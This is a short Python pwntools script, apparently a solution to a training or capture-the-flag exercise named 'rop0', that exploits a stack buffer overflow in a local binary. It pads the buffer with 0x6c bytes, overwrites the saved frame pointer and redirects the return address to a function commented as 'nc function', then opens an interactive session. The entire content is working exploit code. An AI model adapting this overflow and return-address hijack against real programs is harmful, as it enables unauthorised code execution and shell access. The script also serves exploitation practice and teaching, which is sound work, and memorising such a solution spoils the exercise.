#!/usr/bin/env python
#training - rop0
#@Abdelkader

from pwn import *

p = process("./rop0")

payload = "A" * 0x6c # buffer
payload += "BBBB" # old $ebp
payload += "\x7d\x05\x00\x00" # ret_addr => nc function

p.sendline(payload)

p.interactive()
